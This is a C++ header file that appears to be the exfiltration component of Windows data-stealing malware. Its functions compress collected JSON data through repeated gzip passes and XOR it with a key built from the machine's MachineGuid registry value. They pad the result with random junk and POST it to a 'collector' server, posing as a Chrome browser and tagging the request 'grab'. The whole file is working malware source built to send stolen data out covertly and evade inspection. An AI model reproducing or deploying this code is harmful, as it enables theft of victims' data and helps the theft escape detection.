#pragma once
#include "crypt.hpp"
#include <winhttp.h>
#include <vector>
#include <string>
#include <cstdint>
#include <random>
#pragma comment(lib,"winhttp.lib")
#pragma comment(lib,"ws2_32.lib")

#include "miniz.h"

inline std::vector<uint8_t> GzipCompress(const std::vector<uint8_t>& in, int level=9) {
    if (in.empty()) return {};
    mz_stream stream{};
    if (mz_deflateInit2(&stream, level, MZ_DEFLATED, -15, 9, MZ_DEFAULT_STRATEGY) != MZ_OK)
        return {};
    stream.next_in  = (const unsigned char*)in.data();
    stream.avail_in = (mz_uint32)in.size();

    std::vector<uint8_t> out(mz_deflateBound(&stream, (mz_ulong)in.size()) + 64);
    stream.next_out  = out.data();
    stream.avail_out = (mz_uint32)out.size();

    if (mz_deflate(&stream, MZ_FINISH) != MZ_STREAM_END) {
        mz_deflateEnd(&stream);
        return {};
    }
    const mz_ulong deflated = stream.total_out;
    mz_deflateEnd(&stream);

    static const uint8_t hdr[10] = { 0x1F,0x8B,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0xFF };
    std::vector<uint8_t> gz;
    gz.reserve(10 + deflated + 8);
    gz.insert(gz.end(), hdr, hdr + 10);
    gz.insert(gz.end(), out.begin(), out.begin() + deflated);

    const uint32_t crc   = (uint32_t)mz_crc32(MZ_CRC32_INIT, in.data(), (mz_uint32)in.size());
    const uint32_t isize = (uint32_t)in.size();
    for (int i = 0; i < 4; ++i) gz.push_back((uint8_t)((crc   >> (8*i)) & 0xFF));
    for (int i = 0; i < 4; ++i) gz.push_back((uint8_t)((isize >> (8*i)) & 0xFF));
    return gz;
}

inline std::vector<uint8_t> MultiGzip(const std::vector<uint8_t>& data, int passes=8) {
    auto cur = data;
    for (int i=0; i<passes; ++i) {
        auto next = GzipCompress(cur, 9);
        if (next.empty() || next.size() >= cur.size()) break;
        cur = std::move(next);
    }
    return cur;
}

#include <array>
inline std::pair<std::array<uint8_t,32>, std::vector<uint8_t>>
XorLayer(const std::vector<uint8_t>& data) {
    std::array<uint8_t,32> key{};
    HKEY hk;
    char guid[64]{}; DWORD gsz = sizeof(guid);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        RegQueryValueExA(hk, "MachineGuid", nullptr, nullptr, (LPBYTE)guid, &gsz);
        RegCloseKey(hk);
    }
    if (gsz == 0) gsz = 1;
    for (int i = 0; i < 32; i++)
        key[i] = (uint8_t)guid[i % gsz] ^ (uint8_t)(i * 13 + 7);
    std::vector<uint8_t> out(data.size());
    for (size_t i = 0; i < data.size(); i++) out[i] = data[i] ^ key[i % 32];
    return {key, out};
}

inline std::vector<uint8_t> InjectJunk(const std::array<uint8_t,32>& key,
                                        const std::vector<uint8_t>& data) {
    static const uint8_t MAGIC[4] = {0xDE, 0xAD, 0xCA, 0xFE};
    std::mt19937 rng(GetTickCount64());
    std::uniform_int_distribution<int> dist(512, 4096);
    int junkLen = dist(rng);
    std::vector<uint8_t> out(junkLen + 4 + 32 + data.size());
    for (int i = 0; i < junkLen; i++) out[i] = (uint8_t)rng();
    memcpy(out.data() + junkLen,      MAGIC,      4);
    memcpy(out.data() + junkLen + 4,  key.data(), 32);
    memcpy(out.data() + junkLen + 36, data.data(), data.size());
    return out;
}

inline bool CollectorUp(const wchar_t* host, INTERNET_PORT port) {
    HINTERNET ses = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        L"(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!ses) return false;
    WinHttpSetTimeouts(ses, 1000, 1500, 1500, 2000);

    bool up = false;
    HINTERNET con = WinHttpConnect(ses, host, port, 0);
    if (con) {
        HINTERNET req = WinHttpOpenRequest(con, L"GET", L"/", nullptr,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (req) {
            up = WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                 WINHTTP_NO_REQUEST_DATA, 0, 0, 0) == TRUE;
            if (up) up = WinHttpReceiveResponse(req, nullptr) == TRUE;
            WinHttpCloseHandle(req);
        }
        WinHttpCloseHandle(con);
    }
    WinHttpCloseHandle(ses);
    return up;
}

inline bool ExfilPost(const wchar_t* host, INTERNET_PORT port,
                      const wchar_t* path, const std::vector<uint8_t>& body) {
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        L"(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    HINTERNET hConn = WinHttpConnect(hSession, host, port, 0);
    if (!hConn) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", path,
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession); return false; }
    WinHttpAddRequestHeaders(hReq,
        L"Content-Type: application/octet-stream\r\nX-ID: grab\r\n",
        (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    BOOL ok = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
    if (ok) WinHttpReceiveResponse(hReq, nullptr);
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession);
    return ok == TRUE;
}

inline void ExfilData(const std::string& jsonStr, const wchar_t* host,
                      INTERNET_PORT port, const wchar_t* path = L"/collect") {
    std::vector<uint8_t> raw(jsonStr.begin(), jsonStr.end());
    auto compressed       = MultiGzip(raw, 8);
    auto [key, xored]     = XorLayer(compressed);
    auto padded           = InjectJunk(key, xored);
    ExfilPost(host, port, path, padded);
}
